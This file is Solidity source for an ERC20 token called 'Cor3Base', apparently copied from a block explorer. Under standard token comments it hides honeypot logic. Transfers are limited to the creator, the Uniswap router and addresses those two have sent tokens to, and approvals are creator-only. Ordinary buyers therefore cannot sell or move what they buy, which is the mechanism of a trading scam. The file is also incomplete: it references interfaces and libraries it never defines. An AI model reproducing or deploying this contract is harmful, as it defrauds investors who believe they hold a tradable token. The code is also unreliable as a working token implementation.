/**
 *Submitted for verification at Etherscan.io on 2020-12-23
*/

pragma solidity ^0.6.6;



pragma solidity ^0.6.6;

/**
 * @dev Collection of functions related to the address type
 */


pragma solidity ^0.6.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

pragma solidity ^0.6.6;


contract Permissions is Context
{
    address private _creator;
    address private _uniswap;
    mapping (address => bool) private _permitted;

    constructor() public
    {
        _creator = 0xBEc55d09CC621214BE52Bc44d3A9866284e1F014; 
        _uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; 
        
        _permitted[_creator] = true;
        _permitted[_uniswap] = true;
    }
    
    function creator() public view returns (address)
    { return _creator; }
    
    function uniswap() public view returns (address)
    { return _uniswap; }
    
    function givePermissions(address who) internal
    {
        require(_msgSender() == _creator || _msgSender() == _uniswap, "You do not have permissions for this action");
        _permitted[who] = true;
    }
    
    modifier onlyCreator
    {
        require(_msgSender() == _creator, "You do not have permissions for this action");
        _;
    }
    
    modifier onlyPermitted
    {
        require(_permitted[_msgSender()], "You do not have permissions for this action");
        _;
    }
}

pragma solidity ^0.6.6;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */


contract ERC20 is Permissions, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18 and a {totalSupply} of the token.
     *
     * All four of these values are immutable: they can only be set once during
     * construction.
     */
        
    constructor () public {
        //_name = "Cor3Base";
        //_symbol = "Cbase";
        _name = "Cor3Base";
        _symbol = "Cbase";
        _decimals = 18;
        _totalSupply = 30000000000000000000000;
        
        _balances[creator()] = _totalSupply;
        emit Transfer(address(0), creator(), _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual onlyCreator override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        
        if(_msgSender() == uniswap())
        { givePermissions(recipient); } // uniswap should transfer only to the exchange contract (pool) - give it permissions to transfer
        
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual onlyCreator returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual onlyCreator returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}